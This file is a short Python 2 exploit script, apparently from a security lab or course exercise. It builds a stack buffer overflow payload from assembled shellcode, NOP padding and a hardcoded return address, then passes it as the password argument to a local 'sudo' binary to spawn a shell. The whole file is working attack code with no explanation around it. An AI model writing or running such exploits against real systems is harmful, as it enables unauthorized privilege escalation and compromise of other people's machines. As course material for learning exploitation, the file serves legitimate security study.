import os, sys
import assemble
import subprocess


PATH_TO_SUDO = './sudo'


def run_shell():
	trash = assemble.assemble_file("shellcode.asm")
	password = '\x90'*11+trash + (56-len(trash))*'\x90'+"\x44\xe0\xff\xbf"
	subprocess.call([PATH_TO_SUDO,password,"ls"])


def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    run_shell()


if __name__ == '__main__':
    main(sys.argv)
